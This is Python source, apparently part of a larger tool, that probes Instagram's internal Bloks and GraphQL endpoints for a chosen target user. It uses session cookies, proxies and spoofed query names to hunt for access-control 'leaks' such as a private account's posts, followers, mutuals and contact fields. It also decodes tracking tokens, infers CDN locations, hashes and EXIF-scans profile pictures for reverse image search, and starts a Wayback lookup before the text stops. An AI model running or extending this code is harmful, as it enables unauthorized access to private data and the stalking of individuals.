        'restrict_eligibility_signals': r'"is_restrict(?:ed|ing)"\s*:\s*(true|false)',
        'mute_signals': r'"is_muting"\s*:\s*(true|false)',
        'follow_state_signals': r'"(?:following|followed_by|outgoing_request|incoming_request)"\s*:\s*(true|false)',
        'menu_item_titles': r'"title"\s*:\s*"([^"]{3,80})"',
        'subtitles': r'"subtitle"\s*:\s*"([^"]{3,200})"',
        'warning_texts': r'"warning"\s*:\s*"([^"]{3,200})"',
        'category_labels': r'"category"\s*:\s*"([^"]{3,50})"',
        'pk_references': r'"(?:user_id|target_user_id|pk)"\s*:\s*"?(\d+)"?',
        'report_reasons': r'"(?:report_reason|reason)"\s*:\s*"([^"]{3,80})"',
        'safety_messages': r'"safety_(?:message|text)"\s*:\s*"([^"]{3,200})"',
    }
    found = {}
    for pat_name, pat in interesting_patterns.items():
        matches = re.findall(pat, payload_str)
        if matches:
            unique = list(dict.fromkeys(matches))[:15]
            found[pat_name] = unique
    if found:
        out['extracted_signals'] = found

                                  
    out['target_pk_in_payload'] = target_pk_str in payload_str

                             
    out['bloks_version'] = bloks_payload.get('bk.action.core.SetVariableAction')
    if isinstance(bloks_payload, dict):
        out['payload_top_keys'] = list(bloks_payload.keys())[:10]

    return out or None


def run_bloks_probes(target_username, target_pk, cookies, save, proxies):
    """Phase 23: 10 bloks framework endpoint. Mobile app UI render
    payload'larını probe eder. Her response 5-50KB JSON; içinde nested
    action tree'sinde block/restrict eligibility, menu items, warning
    texts, report categories gibi REST'te olmayan UI data var."""
    if not cookies or not target_pk:
        return [], None

    viewer_pk = (cookies or {}).get('ds_user_id', '')
    aggregated = {
        'target_pk': str(target_pk),
        'target_username': target_username,
        'viewer_pk': viewer_pk,
        'endpoints_probed': [],
        'intel': {},
    }
    probes = []

    print(f"  [*] {len(BLOKS_PROBE_APPS)} Bloks app endpoint")

    h_base = build_mobile_pigeon_headers(cookies)
    h_base['x-csrftoken'] = cookies['csrftoken']
    h_base['content-type'] = 'application/x-www-form-urlencoded'
                            
    h_base['x-bloks-is-prefetch'] = 'false'
    h_base['x-bloks-is-panorama-enabled'] = 'true'
    h_base['x-bloks-version-id'] = h_base.get('x-bloks-version-id',
                                                 'e8629f53d8e88f1e51b8a6c5d6'
                                                 'e67c2c6b13f5d47b1e5e8c13f5d47b1e5e8c')

    for app_id, params_tpl, label, intel_key in BLOKS_PROBE_APPS:
        params = params_tpl.format(pk=target_pk, username=target_username)
        url = f'https://i.instagram.com/api/v1/bloks/apps/{app_id}/'
        body = f'params={params}&bk_client_context=%7B%7D&bloks_versioning_id={h_base.get("x-bloks-version-id")}'

        try:
            r = requests.post(url, headers=h_base, cookies=cookies, data=body,
                               proxies=proxies, timeout=30,
                               allow_redirects=False)
        except requests.exceptions.RequestException as e:
            print(f"  [POST] {label:<26} EXC {type(e).__name__}")
            time.sleep(0.5)
            continue

        sig = response_signature(r)
        intel = None
        if r.status_code == 200 and len(r.text) > 100:
            intel = parse_bloks_response(label, r.text, target_pk)
        plabel = f'bloks__{label}'
        if save:
            ext = ('json' if r.text.strip().startswith('{')
                    else 'html' if '<html' in r.text.lower()
                    else 'txt')
            save_artifact(target_username, plabel, r.text, ext)

        flag = ''
        if intel:
            sigs = intel.get('extracted_signals') or {}
            if sigs:
                top_sigs = list(sigs.keys())[:3]
                flag = f" *** signals={top_sigs}"
                if sigs.get('subtitles'):
                    flag += f" sub_count={len(sigs['subtitles'])}"
                if sigs.get('menu_item_titles'):
                    flag += f" menu={len(sigs['menu_item_titles'])}"
            elif intel.get('payload_size_chars'):
                flag = f" payload={intel['payload_size_chars']}ch"
            elif intel.get('error'):
                flag = f" err={intel['error']}"

        print(f"  [POST] {label:<26} HTTP {sig['status']:<3} "
              f"{sig['bytes']:>5}B{flag}")

        if intel:
            target_bucket = aggregated['intel'].setdefault(intel_key, {})
            target_bucket[label] = intel
        aggregated['endpoints_probed'].append({
            'label': label, 'app_id': app_id, 'status': sig['status'],
            'bytes': sig['bytes'], 'has_intel': bool(intel),
        })
        probes.append({
            'kind': f'bloks_{label}', 'url': url,
            'label': plabel, 'sig': sig,
            'scan': scan_markers(r.text), 'response': r,
            'bloks_intel': intel,
        })
        time.sleep(0.5)

                       
    summary = {}
    for cat_name, cat in aggregated['intel'].items():
        for endpoint_label, intel in cat.items():
            sigs = intel.get('extracted_signals') or {}
            for sig_name, vals in sigs.items():
                summary[f'{endpoint_label}__{sig_name}'] = vals[:8]
            if intel.get('payload_size_chars'):
                summary[f'{endpoint_label}__payload_size'] = intel[
                    'payload_size_chars']

    aggregated['summary'] = summary

    out_path = os.path.join(ARTIFACT_ROOT, target_username,
                              'bloks_probe.json')
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(aggregated, f, indent=2, ensure_ascii=False)

    print()
    if summary:
        print(f"  [+] BLOKS PROBE SUMMARY:")
        for k, v in summary.items():
            v_str = json.dumps(v, ensure_ascii=False) if isinstance(
                v, (dict, list)) else str(v)
            if len(v_str) > 130:
                v_str = v_str[:130] + '...'
            print(f"      {k:<46} = {v_str}")
    else:
        print(f"  [-] Hiçbir bloks endpoint kayda değer pattern döndürmedi.")
    rel = os.path.relpath(out_path, os.path.dirname(os.path.abspath(__file__)))
    print(f"  saved -> {rel}")
    return probes, None


                                                                      
                                                                     
                                        
                                                                       
                                                                     
                                                                         
                                                           
 
                                                                        
                                                                    
                                                                     

                                                                              
KNOWN_POLARIS_QUERIES = [
                                                      
    ('PolarisProfilePageContentQuery', None, 'profile_page'),
    ('PolarisProfilePostsTabContentQuery_connection',
     '8616647178463450', 'posts_tab'),
    ('PolarisProfilePostsTabContentDirectQuery_connection',
     '7274538449353069', 'posts_tab_direct'),
    ('PolarisProfileReelsTabContentQuery_connection',
     '8645213985574502', 'reels_tab'),
    ('PolarisProfileTaggedPostsTabContentQuery_connection',
     None, 'tagged_tab'),
    ('PolarisProfileFollowersTabContentQuery', None, 'followers_tab'),
    ('PolarisProfileFollowingTabContentQuery', None, 'following_tab'),
    ('PolarisRelatedAccountsQuery', None, 'related_accounts'),
    ('PolarisProfileStoriesQuery', None, 'profile_stories'),
    ('PolarisProfileMutualFollowersQuery', None, 'mutual_followers_gql'),
]

                                                                          
                                                                       
                                                                  
FRIENDLY_NAME_SPOOFS = [
    'PolarisProfilePostsLoggedOutTabContentQuery',
    'PolarisProfilePostsRestrictedQuery',
    'PolarisProfilePostsDirectQuery',
    'usePolarisProfilePostsTabContentQuery_connection',
                                                         
    '',
]


def variable_shape_for(shape_name, target_pk, target_username):
    """Polaris GraphQL query'lerinin variable shape'leri farklı; en sık
    kullanılan 8 şablonu dene."""
    pk_str = str(target_pk)
    base_shapes = {
        'profile_page': [
            {'id': pk_str, 'render_surface': 'PROFILE'},
            {'username': target_username, 'render_surface': 'PROFILE'},
            {'id': pk_str},
        ],
        'posts_tab': [
            {'id': pk_str, 'first': 12},
            {'user_id': pk_str, 'first': 12, 'after': None},
            {'data': {'count': 12}, 'username': target_username,
              'first': 12},
        ],
        'posts_tab_direct': [
            {'id': pk_str, 'first': 12},
        ],
        'reels_tab': [
            {'id': pk_str, 'first': 12, 'data': {
                'include_relationship_info': True}},
            {'user_id': pk_str, 'first': 12},
        ],
        'tagged_tab': [
            {'id': pk_str, 'first': 12},
            {'user_id': pk_str, 'first': 12},
        ],
        'followers_tab': [
            {'id': pk_str, 'first': 24, 'search_surface': 'follow_list_page'},
            {'user_id': pk_str, 'first': 24},
        ],
        'following_tab': [
            {'id': pk_str, 'first': 24, 'search_surface': 'follow_list_page'},
            {'user_id': pk_str, 'first': 24},
        ],
        'related_accounts': [
            {'id': pk_str, 'first': 12, 'include_chaining_info': True},
            {'user_id': pk_str, 'include_chaining': True},
        ],
        'profile_stories': [
            {'id': pk_str},
            {'user_id': pk_str, 'reel_ids': [pk_str]},
        ],
        'mutual_followers_gql': [
            {'id': pk_str, 'first': 24},
        ],
    }
    return base_shapes.get(shape_name, [{'id': pk_str}])


def extract_fresh_doc_ids_from_html(text):
    """Live HTML'den friendly_name -> doc_id mapping çıkar.
    Polaris HTML'inde adp_<QueryName>RelayPreloader_<doc_id> şeklinde
    referanslar var, ayrıca __SCRIPT__ içinde 'doc_id':'<num>' geçiyor."""
    mapping = {}
                                                                      
    for m in re.finditer(
            r'adp_([\w]+?RelayPreloader)_(\d+)', text):
        name, doc = m.group(1), m.group(2)
                                                  
        clean_name = name.replace('RelayPreloader', '')
        mapping.setdefault(clean_name, doc)
                                                       
    for m in re.finditer(
            r'"queryName"\s*:\s*"([^"]+)"\s*,\s*"doc_id"\s*:\s*"(\d+)"', text):
        mapping[m.group(1)] = m.group(2)
                                                       
    for m in re.finditer(
            r'"friendly_name"\s*:\s*"([^"]+)"\s*,\s*"doc_id"\s*:\s*"(\d+)"',
            text):
        mapping[m.group(1)] = m.group(2)
    return mapping


def parse_graphql_fresh_response(text):
    """GraphQL response'unu privacy-relevant alanlar için tara.
    En değerli sızıntılar:
      - data.user.edge_owner_to_timeline_media.edges (private feed!)
      - data.user.edge_followed_by.edges (followers list)
      - data.user.edge_follow.edges (following list)
      - data.user.edge_related_profiles.edges (chaining)
      - data.user.edge_mutual_followed_by.edges (mutuals)
      - data.xig_user_by_igid_v2.* (low-level user)
    """
    try:
        d = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None
    if not isinstance(d, dict):
        return None
    out = {}
    out['response_size'] = len(text)
    out['top_keys'] = list(d.keys())[:8]

                                                               
    if d.get('errors'):
        out['errors'] = [
            {'message': e.get('message'),
             'path': e.get('path'),
             'severity': e.get('severity'),
             'description': e.get('description'),
             'extensions': e.get('extensions')}
            for e in d['errors'][:3]
        ]

    data = d.get('data') or {}
    if not isinstance(data, dict):
        return out or None

                      
    user = (data.get('user')
             or data.get('xdt_user_by_username')
             or data.get('xig_user_by_igid_v2')
             or {})
    if isinstance(user, dict) and user:
        out['user_keys'] = list(user.keys())[:30]
                                        
        for k in ('id', 'pk', 'fbid_v2', 'eimu_id', 'guardian_id',
                   'username', 'full_name', 'is_private', 'is_verified',
                   'has_blocked_viewer', 'blocked_by_viewer',
                   'restricted_by_viewer', 'follows_viewer',
                   'followed_by_viewer', 'requested_by_viewer',
                   'mutual_followers_count', 'public_email',
                   'public_phone_number', 'business_email',
                   'business_phone_number', 'category_name',
                   'business_address_json', 'country_block',
                   'group_metadata', 'biography', 'external_url',
                   'fb_profile_biolink', 'pronouns'):
            if k in user and user[k] is not None and user[k] != '':
                out[f'user_{k}'] = user[k]

                                                              
        for edge_name in ('edge_owner_to_timeline_media',
                            'edge_owner_to_timeline_media_v2',
                            'edge_felix_video_timeline',
                            'edge_owner_to_timeline_clips',
                            'edge_followed_by', 'edge_follow',
                            'edge_mutual_followed_by',
                            'edge_related_profiles',
                            'edge_chaining', 'edge_owner_to_tagged_media',
                            'edge_saved_media'):
            edge = user.get(edge_name) or {}
            if isinstance(edge, dict):
                count = edge.get('count')
                edges = edge.get('edges') or []
                page_info = edge.get('page_info') or {}
                if count is not None or edges:
                    out[f'{edge_name}__count'] = count
                    out[f'{edge_name}__edges_returned'] = len(edges)
                    if edges:
                                                                       
                        out[f'{edge_name}__sample_nodes'] = []
                        for e in edges[:5]:
                            n = (e.get('node') or {})
                            sample = {
                                'id': n.get('id'),
                                'pk': n.get('pk'),
                                'username': n.get('username'),
                                'shortcode': n.get('shortcode'),
                                'taken_at_timestamp': n.get(
                                    'taken_at_timestamp'),
                                'display_url': (n.get('display_url')
                                                  or '')[:100],
                                'thumbnail_src': (n.get('thumbnail_src')
                                                    or '')[:100],
                                'edge_media_to_caption': bool(
                                    n.get('edge_media_to_caption')),
                                'is_video': n.get('is_video'),
                                'video_url': (n.get('video_url')
                                                or '')[:100],
                                'edge_liked_by_count': (
                                    (n.get('edge_liked_by') or {}).get(
                                        'count') or
                                    (n.get('edge_media_preview_like') or {}
                                     ).get('count')),
                                'edge_media_to_comment_count': (
                                    (n.get('edge_media_to_comment')
                                      or {}).get('count')),
                            }
                            out[f'{edge_name}__sample_nodes'].append(sample)
                        out[f'{edge_name}__has_next_page'] = page_info.get(
                            'has_next_page')

                                                    
    reels = data.get('reels_media') or data.get('reel_feed')
    if reels:
        out['reels_present'] = True
        out['reels_data_keys'] = (list(reels.keys())[:5]
                                     if isinstance(reels, dict) else 'list')

    return out or None


def warmup_html_for_doc_ids(target_username, cookies, proxies):
    """Phase 24 ön koşulu: live HTML fetch et, fresh doc_id'leri çıkar."""
    url = f'https://www.instagram.com/{target_username}/'
    v = next((x for x in HEADER_VARIANTS if not x.get('mobile')),
              HEADER_VARIANTS[0])
    h = build_headers(v)
    if cookies:
        h['x-csrftoken'] = cookies['csrftoken']
    try:
        r = requests.get(url, headers=h, cookies=cookies, proxies=proxies,
                          timeout=30, allow_redirects=True)
    except requests.exceptions.RequestException:
        return None, None, None
    tokens = extract_session_tokens(r.text)
    fresh_doc_map = extract_fresh_doc_ids_from_html(r.text)
    return r, tokens, fresh_doc_map


def run_graphql_fresh(target_username, target_pk, cookies, save, proxies):
    """Phase 24: 1) live HTML'den fresh doc_id'leri çıkar, 2) bilinen
    Polaris query'leri için fresh > fallback doc_id seç, 3) her query'yi
    8'e kadar variable shape ve 5 friendly_name spoof ile POST et."""
    if not cookies or not target_pk:
        return [], None

    print(f"  [*] Live HTML fetch → fresh doc_id extraction...")
    r_html, tokens, fresh_doc_map = warmup_html_for_doc_ids(
        target_username, cookies, proxies)
    if not tokens:
        print(f"  [-] HTML warmup başarısız; abort.")
        return [], None
    print(f"      lsd={'OK' if tokens['lsd'] else 'MISS'}  "
          f"fb_dtsg={'OK' if tokens['fb_dtsg'] else 'MISS'}  "
          f"hsi={tokens['hsi']}  rev={tokens['rev']}")
    print(f"      fresh doc_id'ler bulundu: {len(fresh_doc_map)}")
    if fresh_doc_map:
        for n, d in list(fresh_doc_map.items())[:8]:
            print(f"        {n} -> {d}")
                                                  
    raw_doc_ids = tokens.get('doc_ids') or []
    print(f"      raw doc_id pool (HTML scriptlerinden): {len(raw_doc_ids)}")

    aggregated = {
        'target_pk': str(target_pk),
        'target_username': target_username,
        'viewer_pk': (cookies or {}).get('ds_user_id', ''),
        'fresh_doc_id_map': fresh_doc_map,
        'raw_doc_ids_count': len(raw_doc_ids),
        'queries_attempted': 0,
        'leaks': [],
        'all_results': [],
    }
    probes = []

                
    v = next((x for x in HEADER_VARIANTS if not x.get('mobile')),
              HEADER_VARIANTS[0])
    base_h = build_headers(v)
    base_h.update({
        'x-ig-app-id':       IG_WEB_APP_ID,
        'x-asbd-id':         '129477',
        'x-fb-lsd':          tokens.get('lsd') or '',
        'x-instagram-ajax':  tokens.get('rev') or '1012650886',
        'x-requested-with':  'XMLHttpRequest',
        'accept':            '*/*',
        'content-type':      'application/x-www-form-urlencoded',
        'origin':            'https://www.instagram.com',
        'sec-fetch-dest':    'empty',
        'sec-fetch-mode':    'cors',
        'sec-fetch-site':    'same-origin',
        'referer':           f'https://www.instagram.com/{target_username}/',
        'x-csrftoken':       cookies.get('csrftoken') or '',
    })
    base_h.pop('upgrade-insecure-requests', None)

    url = 'https://www.instagram.com/graphql/query/'
    leak_count = 0
    request_count = 0
    pk_str = str(target_pk)

    for friendly_name, fallback_doc, shape_name in KNOWN_POLARIS_QUERIES:
                                               
        doc_id = fresh_doc_map.get(friendly_name) or fallback_doc
                                                                
                                                                   
                                                   
        if not doc_id and raw_doc_ids:
                                                       
            doc_id = raw_doc_ids[0]

        if not doc_id:
            print(f"  [SKIP] {friendly_name:<50} no doc_id mapping")
            continue

        shapes = variable_shape_for(shape_name, target_pk, target_username)

                                                                       
        all_friendly_names = [friendly_name] + FRIENDLY_NAME_SPOOFS

        for fn in all_friendly_names:
            for shape_idx, vars_ in enumerate(shapes):
                request_count += 1
                h = dict(base_h)
                h['x-fb-friendly-name'] = fn
                body_dict = {
                    'av':                       (cookies or {}).get(
                        'ds_user_id', '0'),
                    'lsd':                      tokens.get('lsd') or '',
                    'jazoest':                  tokens.get('jazoest') or '',
                    'fb_dtsg':                  tokens.get('fb_dtsg') or '',
                    '__a':                      '1',
                    '__d':                      'www',
                    '__user':                   '0',
                    '__req':                    str(request_count),
                    '__hs':                     tokens.get('hsi') or '',
                    'dpr':                      '1',
                    '__ccg':                    'EXCELLENT',
                    '__rev':                    tokens.get('rev') or '',
                    '__s':                      '::',
                    '__hsi':                    tokens.get('hsi') or '',
                    'fb_api_caller_class':      'RelayModern',
                    'fb_api_req_friendly_name': fn,
                    'variables':                json.dumps(
                        vars_, separators=(',', ':')),
                    'server_timestamps':        'true',
                    'doc_id':                   doc_id or '',
                }
                                
                from urllib.parse import urlencode
                body = urlencode(body_dict)

                try:
                    rr = requests.post(url, headers=h, cookies=cookies,
                                        data=body, proxies=proxies,
                                        timeout=30, allow_redirects=False)
                except requests.exceptions.RequestException:
                    continue

                sig = response_signature(rr)
                intel = None
                if rr.status_code == 200 and rr.text.strip().startswith('{'):
                    intel = parse_graphql_fresh_response(rr.text)

                                                         
                leak_indicators = []
                if intel:
                    for k, v_data in intel.items():
                        if k.endswith('__sample_nodes') and v_data:
                            leak_indicators.append(
                                f'{k}={len(v_data)}_nodes')
                        elif k.endswith('__edges_returned') and v_data:
                            leak_indicators.append(
                                f'{k.replace("__edges_returned","")}'
                                f'={v_data}edges')

                fn_short = (fn[:32] if fn else '<empty>')
                short_q = friendly_name.replace(
                    'PolarisProfile', 'PP')[:25]
                marker = ''
                if leak_indicators:
                    marker = f' *** LEAK {leak_indicators}'
                    leak_count += 1
                    aggregated['leaks'].append({
                        'friendly_name': fn,
                        'doc_id': doc_id,
                        'shape_idx': shape_idx,
                        'indicators': leak_indicators,
                        'intel': intel,
                    })
                elif intel and intel.get('errors'):
                    err_msg = intel['errors'][0].get('message', '')[:40]
                    marker = f' err="{err_msg}"'
                elif intel and intel.get('user_keys'):
                    marker = f' user_keys={len(intel["user_keys"])}'

                print(f"  {short_q:<25} fn={fn_short:<35} "
                      f"shape{shape_idx} HTTP {sig['status']:<3} "
                      f"{sig['bytes']:>6}B{marker}")

                aggregated['all_results'].append({
                    'friendly_name': fn,
                    'doc_id': doc_id,
                    'shape_idx': shape_idx,
                    'status': sig['status'],
                    'bytes': sig['bytes'],
                    'has_user_data': bool(intel and intel.get('user_keys')),
                    'has_leak': bool(leak_indicators),
                })
                if save and intel and (leak_indicators or
                                          intel.get('user_keys')):
                    plabel = (f'gql_fresh__{short_q}__{fn_short[:20]}'
                                f'__shape{shape_idx}')
                    save_artifact(target_username, plabel, rr.text, 'json')

                probes.append({
                    'kind': f'gql_fresh_{friendly_name}',
                    'url': url,
                    'label': f'gql_fresh__{friendly_name}__{fn[:20]}',
                    'sig': sig,
                    'scan': scan_markers(rr.text),
                    'response': rr,
                    'gql_intel': intel,
                })
                time.sleep(0.3)

    aggregated['queries_attempted'] = request_count
    aggregated['leak_count'] = leak_count

          
    out_path = os.path.join(ARTIFACT_ROOT, target_username,
                              'graphql_fresh.json')
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(aggregated, f, indent=2, ensure_ascii=False)

    print()
    print(f"  [+] GraphQL fresh: {request_count} request, {leak_count} leak")
    if aggregated['leaks']:
        print(f"  [+] LEAK DETAILS:")
        for leak in aggregated['leaks'][:5]:
            print(f"      friendly_name={leak['friendly_name']}")
            print(f"      doc_id={leak['doc_id']}  shape={leak['shape_idx']}")
            print(f"      indicators={leak['indicators']}")
            for k, v in (leak['intel'] or {}).items():
                if k.endswith('__sample_nodes') and v:
                    for n in v[:3]:
                        print(f"        {k}: {json.dumps(n, ensure_ascii=False)[:130]}")
            print()
    rel = os.path.relpath(out_path, os.path.dirname(os.path.abspath(__file__)))
    print(f"  saved -> {rel}")
    return probes, None


                                                                           
                                                                               
                                                                      
                              
 
                                                                  
                                                                              
                                                         
                                
                                                                            
                             
                                            
                                                                      
                                                           
                                                                 
                                                                         
                                                                       

import base64
import hashlib

_PROFILE_PIC_HOST_SUFFIXES = ('cdninstagram.com', 'fbcdn.net')
_PROFILE_PIC_MAX_BYTES = 5 * 1024 * 1024


def _trusted_profile_pic_url(value):
    """Accept only HTTPS Instagram/Meta image CDN URLs without credentials."""
    try:
        parsed = urlparse(str(value or ''))
        port = parsed.port
    except (TypeError, ValueError):
        return False
    host = (parsed.hostname or '').lower().rstrip('.')
    return (parsed.scheme == 'https'
            and port in (None, 443)
            and parsed.username is None and parsed.password is None
            and any(host == suffix or host.endswith('.' + suffix)
                    for suffix in _PROFILE_PIC_HOST_SUFFIXES))


def _profile_pic_content_type(body):
    """Identify a small allowlist of browser-safe raster formats by magic."""
    if body.startswith(b'\xff\xd8\xff'):
        return 'image/jpeg'
    if body.startswith(b'\x89PNG\r\n\x1a\n'):
        return 'image/png'
    if body.startswith(b'RIFF') and len(body) >= 12 and body[8:12] == b'WEBP':
        return 'image/webp'
    if body.startswith((b'GIF87a', b'GIF89a')):
        return 'image/gif'
    if (len(body) >= 12 and body[4:8] == b'ftyp'
            and (body[8:12] in (b'avif', b'avis')
                 or b'avif' in body[8:32] or b'avis' in body[8:32])):
        return 'image/avif'
    return None

IG_SNOWFLAKE_EPOCH_MS = 1314220021721                                       


def snowflake_decode(numeric_id):
    """IG/FB Snowflake: 41-bit ms ts + 10-bit shard + 12-bit sequence.
    Returns ts_ms or None."""
    try:
        nid = int(numeric_id)
    except (ValueError, TypeError):
        return None
    if nid <= 0:
        return None
                                         
    ts_ms = (nid >> 23) + IG_SNOWFLAKE_EPOCH_MS
    return ts_ms


def parse_cdn_url(url):
    """IG CDN URL'inden datacenter, cluster, content age, hash gibi
    privacy-relevant alanları çıkarır. UI bunları göstermez."""
    if not url:
        return None
    out = {}
                                  
    edge_match = re.search(r'scontent[-]?([a-z0-9]+)[-]?(\d+)?\.cdninstagram',
                             url)
    if edge_match:
        edge_code = edge_match.group(1)
        out['cdn_edge_code'] = edge_code
                                       
        EDGE_MAP = {
            'fra': 'Frankfurt, DE', 'lhr': 'London, UK',
            'ams': 'Amsterdam, NL', 'cdg': 'Paris, FR',
            'arn': 'Stockholm, SE', 'mad': 'Madrid, ES',
            'mxp': 'Milan, IT', 'fco': 'Rome, IT',
            'vie': 'Vienna, AT', 'prg': 'Prague, CZ',
            'ist': 'Istanbul, TR', 'svo': 'Moscow, RU',
            'bos': 'Boston, US', 'iad': 'Ashburn, US',
            'jfk': 'New York, US', 'lax': 'Los Angeles, US',
            'sjc': 'San Jose, US', 'mia': 'Miami, US',
            'dfw': 'Dallas, US', 'ord': 'Chicago, US',
            'atl': 'Atlanta, US', 'sea': 'Seattle, US',
            'gru': 'Sao Paulo, BR', 'eze': 'Buenos Aires, AR',
            'nrt': 'Tokyo, JP', 'icn': 'Seoul, KR',
            'hkg': 'Hong Kong, HK', 'sin': 'Singapore, SG',
            'syd': 'Sydney, AU', 'bom': 'Mumbai, IN',
            'del': 'Delhi, IN', 'maa': 'Chennai, IN',
            'gig': 'Rio de Janeiro, BR',
        }
        out['cdn_edge_city'] = EDGE_MAP.get(edge_code,
                                              f'unknown ({edge_code})')

                         
    from urllib.parse import urlparse, parse_qs
    qs = parse_qs(urlparse(url).query)
    for k in ('_nc_cat', '_nc_oc', '_nc_ohc', '_nc_gid', '_nc_sid',
               '_nc_ht', 'efg', 'edm', 'ccb', 'oe', 'oh', 'stp',
               'ig_cache_key'):
        if k in qs:
            out[f'qs_{k}'] = qs[k][0][:80]

                                                               
    oe = qs.get('oe', [None])[0]
    if oe:
        try:
            expiry_ts = int(oe, 16)               
            import datetime
            expiry_dt = datetime.datetime.fromtimestamp(
                expiry_ts, tz=datetime.timezone.utc)
            out['cdn_expiry_iso'] = expiry_dt.isoformat()
            now = datetime.datetime.now(datetime.timezone.utc)
            ttl_hours = (expiry_dt - now).total_seconds() / 3600
            out['cdn_ttl_hours_remaining'] = round(ttl_hours, 2)
                                                                            
            upload_approx = expiry_dt - datetime.timedelta(days=7)
            out['cdn_upload_approx_iso'] = upload_approx.isoformat()
        except (ValueError, OSError, OverflowError):
            pass

                                     
    efg = qs.get('efg', [None])[0]
    if efg:
        try:
                                
            padded = efg + '=' * ((4 - len(efg) % 4) % 4)
            decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
            out['efg_decoded'] = decoded[:200]
                                                                     
            tag_match = re.search(r'"encode_tag"\s*:\s*"([^"]+)"', decoded)
            if tag_match:
                out['encode_tag'] = tag_match.group(1)
                                                                  
                res_match = re.search(r'\.(\d+)\.c2', tag_match.group(1))
                if res_match:
                    out['original_resolution'] = int(res_match.group(1))
        except Exception:
            pass

                                              
    nc_cat = qs.get('_nc_cat', [None])[0]
    if nc_cat:
        try:
            cat_int = int(nc_cat)
                                                                         
            CAT_REGIONS = {
                range(100, 105): 'US East/Central cluster',
                range(105, 109): 'EU West cluster (London/Paris)',
                range(109, 112): 'EU Central cluster (Frankfurt/Amsterdam)',
                range(1, 50): 'Internal/diagnostic cluster',
            }
            for cat_range, region in CAT_REGIONS.items():
                if cat_int in cat_range:
                    out['cluster_region_hint'] = region
                    break
        except ValueError:
            pass

    return out or None


def parse_bio_click_id(click_id):
    """Bio link click_id IG'nin FB tracking hash'idir.
    Format: PAZXh0bgN...AAGn7bO...aem_<random>
    İlk 11 karakter app_id encoded (PAZXh0bgN = "P\x18,..." → 567067343352427).
    aem_ sonrası random session id.
    """
    if not click_id:
        return None
    out = {'raw_click_id': click_id[:80] + '...' if len(click_id) > 80
                            else click_id}
                                            
    if 'aem_' in click_id:
        out['has_aem_session'] = True
        aem_part = click_id.split('aem_')[1]
        out['aem_session_id'] = aem_part[:40]
                                             
    if click_id.startswith('PAZX'):
        try:
                                    
            head = click_id[:24]
            padded = head + '=' * ((4 - len(head) % 4) % 4)
            decoded = base64.urlsafe_b64decode(padded.replace('-', '+')
                                                  .replace('_', '/'))
            out['head_decoded_hex'] = decoded.hex()[:48]
        except Exception:
            pass
    return out


def parse_xmt_token(threads_url):
    """barcelona://user?username=X&xmt=AQF0...
    xmt token Meta cross-app token. Base64-like encoded payload."""
    if not threads_url or 'xmt=' not in threads_url:
        return None
    xmt = threads_url.split('xmt=')[1].split('&')[0]
    out = {'xmt_raw': xmt[:80] + '...' if len(xmt) > 80 else xmt,
           'xmt_length': len(xmt)}
                                   
    if xmt.startswith('AQF'):
        out['xmt_format_version'] = 'v1 (AQF prefix)'
                                
        try:
            padded = xmt + '=' * ((4 - len(xmt) % 4) % 4)
            decoded = base64.urlsafe_b64decode(padded.replace('-', '+')
                                                  .replace('_', '/'))
            out['xmt_decoded_hex'] = decoded.hex()
            out['xmt_decoded_length'] = len(decoded)
                                                                         
            if len(decoded) >= 12:
                user_id_bytes = decoded[4:12]
                user_id_int = int.from_bytes(user_id_bytes, 'big')
                out['xmt_extracted_id'] = str(user_id_int)
        except Exception:
            pass
    return out


def hash_profile_pic(pic_url, proxies, save_path=None):
    """Profile pic'i indir, SHA256 hash + dimensions + EXIF check.
    Reverse image search için hash'i kullan."""
    if not pic_url:
        return None
    remote_url = str(pic_url)
    if not _trusted_profile_pic_url(remote_url):
        return {'error': 'untrusted_avatar_url'}
    r = None
    reported_content_type = None
    try:
        for _ in range(4):
            r = requests.get(remote_url, timeout=20, proxies=proxies,
                             allow_redirects=False, stream=True)
            if r.status_code not in (301, 302, 303, 307, 308):
                break
            location = r.headers.get('location')
            next_url = urljoin(remote_url, location or '')
            r.close()
            r = None
            if not location or not _trusted_profile_pic_url(next_url):
                return {'error': 'untrusted_avatar_redirect'}
            remote_url = next_url
        if r is None:
            return {'error': 'avatar_redirect_limit'}
        if r.status_code != 200:
            return {'http_status': r.status_code}
        reported_content_type = r.headers.get('content-type')
        try:
            declared_size = int(r.headers.get('content-length') or 0)
        except ValueError:
            declared_size = 0
        if declared_size > _PROFILE_PIC_MAX_BYTES:
            return {'error': 'avatar_too_large'}
        chunks = []
        total = 0
        for chunk in r.iter_content(chunk_size=64 * 1024):
            if not chunk:
                continue
            total += len(chunk)
            if total > _PROFILE_PIC_MAX_BYTES:
                return {'error': 'avatar_too_large'}
            chunks.append(chunk)
        img_bytes = b''.join(chunks)
    except requests.exceptions.RequestException as e:
        return {'error': type(e).__name__}
    finally:
        if r is not None:
            r.close()
    if not img_bytes:
        return {'error': 'empty_avatar'}
    actual_content_type = _profile_pic_content_type(img_bytes)
    if actual_content_type is None:
        return {'error': 'invalid_avatar_content'}
    out = {
        'sha256': hashlib.sha256(img_bytes).hexdigest(),
        'size_bytes': len(img_bytes),
        'content_type': actual_content_type,
        'reported_content_type': reported_content_type,
    }
                                        
    try:
        from PIL import Image
        from io import BytesIO
        img = Image.open(BytesIO(img_bytes))
        out['real_dimensions'] = f'{img.width}x{img.height}'
        out['format'] = img.format
                                                     
        try:
            exif = img.getexif()
            if exif:
                exif_data = {}
                for tag_id, value in exif.items():
                    if isinstance(value, (str, int, float, bytes)):
                        exif_data[str(tag_id)] = (str(value)[:100]
                                                    if value else None)
                if exif_data:
                    out['exif_data'] = exif_data
                    out['exif_present'] = True
        except Exception:
            pass
    except ImportError:
        out['pillow_not_installed'] = True
    except (OSError, ValueError):
        out['image_parse_error'] = True
    if save_path:
        try:
            with open(save_path, 'wb') as f:
                f.write(img_bytes)
            out['saved_to'] = save_path
        except OSError:
            pass
    return out


def probe_wayback_for_pk(target_pk, target_username, proxies):
    """Wayback Machine PK-based + username history search.
    URL: web.archive.org/cdx/search/cdx?url=instagram.com/<username>"""
    out = {}
                     
    cdx_url = (f'https://web.archive.org/cdx/search/cdx?url=instagram.com/'
                f'{target_username}/&output=json&limit=50&from=20180101')
    headers = {'user-agent': 'Mozilla/5.0 poc-forensics'}
    try:
